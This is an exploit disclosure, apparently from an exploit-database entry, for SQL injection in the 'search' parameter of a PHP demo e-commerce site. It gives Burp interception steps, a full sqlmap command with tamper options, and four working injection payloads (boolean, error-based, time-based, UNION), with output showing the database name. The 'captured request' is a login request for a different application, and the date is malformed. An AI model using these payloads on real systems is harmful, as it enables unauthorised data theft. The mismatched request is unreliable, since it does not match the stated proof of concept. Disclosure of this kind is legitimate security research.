# E-Commerce Website - SQL Injection 1
+ Exploit Title: E-Commerce Website - SQL Injection
+ Date: 2023-24-12
+ Exploit Author: Hamdi Sevben
+ Vendor Homepage: https://code-projects.org/e-commerce-website-in-php-with-source-code/
+ Software Link: https://download-media.code-projects.org/2020/01/E-COMMERCE_WEBSITE_IN_PHP_WITH_SOURCE_CODE.zip
+ Version: 1.0
+ Tested on: Windows 10 Pro + PHP 8.1.6, Apache 2.4.53

## References:

## Description:

E-Commerce Website 1.0 allows SQL Injection via parameter 'search' in "/Electricks/Electricks-shop/index_search.php".
Exploiting this issue could allow an attacker to compromise the application, access or modify data,  or exploit latest vulnerabilities in the underlying database.


## Proof of Concept:

Go to the Search Product textbox: "http://localhost/Electricks/Electricks-shop/index_search.php"
Fill Enter product name and search.
Intercept the request via Burp Suite and send to Repeater.
Copy and paste the request to a "r.txt" file.
Use sqlmap to exploit.

---

Captured Burp request:
```
POST /libsystem/admin/login.php HTTP/1.1
Host: localhost
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-us,en;q=0.5
Cache-Control: no-cache
Content-Length: 313
Content-Type: application/x-www-form-urlencoded
Referer: http://localhost/libsystem/admin/
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36

username=admin&login=&password=Pass
```

---

In sqlmap, use 'search' parameter to dump the database. 

`python sqlmap.py -r r.txt -p search --risk 3 --level 5 --threads 1 --random-agent tamper=between,randomcase --proxy="http://127.0.0.1:8080" --dbms mysql --batch --current-db`

```
---
Parameter: search (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: search=test' OR NOT 4831=4831-- wglp

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: search=test' AND (SELECT 3794 FROM(SELECT COUNT(*),CONCAT(0x717a707a71,(SELECT (ELT(3794=3794,1))),0x7162706b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- tgSG

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: search=test' AND (SELECT 9664 FROM (SELECT(SLEEP(5)))rvAF)-- dHfN

    Type: UNION query
    Title: Generic UNION query (NULL) - 12 columns
    Payload: search=test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x717a707a71,0x6f6e55424c5968486469704d474a566a75696b44596473587874685a79756d7378646a7942777564,0x7162706b71),NULL,NULL,NULL,NULL,NULL,NULL-- -
---
[19:47:41] [INFO] the back-end DBMS is MySQL
web application technology: PHP 8.1.6, Apache 2.4.53
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[19:47:41] [INFO] fetching current database
current database: 'electricks'
```

current database: `electricks`

![1](https://github.com/h4md153v63n/CVEs/assets/5091265/e2d64c21-ad38-4af7-977c-d140d0642a28)
